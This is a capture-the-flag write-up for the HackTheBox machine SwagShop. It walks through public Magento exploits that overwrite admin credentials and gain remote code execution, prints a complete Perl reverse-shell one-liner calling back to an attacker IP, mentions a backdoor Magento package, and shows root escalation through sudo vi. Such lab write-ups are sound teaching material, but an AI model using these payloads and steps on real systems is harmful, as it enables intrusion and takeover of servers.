---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-05-16-swagshop-hackthebox
tags:
- cve
- hackthebox
- linux
- magento
- sudo
title: SwagShop @ HackTheBox
---

SwagShop is a very easy machine on hackthebox, involving a public exploit and sudo abuse.

## User Flag

We start with a quick port scan:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://10.10.10.140/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On port 80 we see an installation of a magento shop:

![](htb_swagshop_web.png)

The footer reveals its from 2014 so there might be some exploits available. We can see at this [page](https://www.cloudways.com/blog/ten-years-of-magento-versions/) that the most recent version in 2014 was 1.9.x so we focus on that one for now. We run `searchsploit magento` and notice an exploit specifically targeting 1.9.0.1:

```
...
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution      | exploits/php/webapps/37811.py
...
```

We look through the source to do our due diligence and see that we have to set some variables for it to work:

```
username = ''
password = ''
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
```

For the username/password bit it wants admin credentials which we do not have at this point. We find another [exploit](https://www.exploit-db.com/exploits/37977) that allows us to potentially overwrite the admin credentials! After changing the url in the script we run it and it successfully changes the admin credentials for us:

```
WORKED
Check http://10.10.10.140/admin with creds forme:forme
```

We can now use the first exploit! Besides entering the admin credentials, we also have to retrieve the file "/app/etc/local.xml" via curl and enter the installation date into the script (like it says in the comment):

```
username = 'forme'
password = 'forme'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Sat, 15 Nov 2014 20:27:57 +0000'  # This needs to be the exact date from /app/etc/local.xml
```

We run the script `python 37811.py http://swagshop.htb 'whoami'` but notice that it doesn’t quite work yet:

```
 raise ControlNotFoundError("no control matching "+description)
mechanize._form.ControlNotFoundError: no control matching name 'login[password]'
```

It looks like the endpoint is wrong. Some googling reveals we have to call it like this:

```
python 37811.py http://swagshop.htb/index.php/admin/index 'whoami'
```

We use the RCE and replace ‘whoami’ with a perl shell:

```
perl -e 'use Socket;$i="10.10.16.66";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
```

```
connect to [10.10.16.66] from swagshop.htb [10.10.10.140] 41344
$ whoami
www-data
$ cd /home/haris
$ wc -lc user.txt
 1 33 user.txt
```

The "37811.py" exploit is kind of unreliable – an alternative way to get RCE, is to upload a malicious [package](https://github.com/lavalamp-/LavaMagentoBD) to <http://swagshop.htb/downloader>. After uploading we send a Post-Request to "/index.php/lavalamp/index", with the parameter "c" containing our shell command.

## Root Flag

Root was very easy on this box. We run `sudo -l` and see the following:

```
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

This means we can get a root shell without any effort:

```
sudo /usr/bin/vi /var/www/html/xct
:!/bin/bash
whoami
root
wc -lc /root/root.txt
 10 270 /root/root.txt
```

Thanks to [ch4p](https://www.hackthebox.eu/home/users/profile/1) for creating the box.